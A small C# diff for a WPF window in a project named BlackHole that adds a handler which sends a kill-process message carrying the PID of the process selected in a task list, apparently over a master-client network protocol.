@@ -6,6 +6,9 @@ using System.Windows.Media.Imaging;
 using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
 using BlackHole.Master.Extentions;
+using System.Collections.Generic;
+using System.Collections;
+using System.Windows.Input;
 
 namespace BlackHole.Master
 {
@@ -53,6 +56,20 @@ namespace BlackHole.Master
                     }
                 }
             });
+        }
+
+        private void KillProcess(object sender, RoutedEventArgs e)
+        {
+            if (TasksList.SelectedItem != null)
+            {
+                Dictionary<string, string> selectedItem = TasksList.SelectedItem as Dictionary<string, string>;
+                //string processName = (new Dictionary<string, string>(TasksList.SelectedItem).Items[0]).Value;
+
+                Send(new KillProcessMessage
+                {
+                    PID = selectedItem["PID"]
+                });
+            }
         }
 
         protected override void OnClosed(EventArgs e)
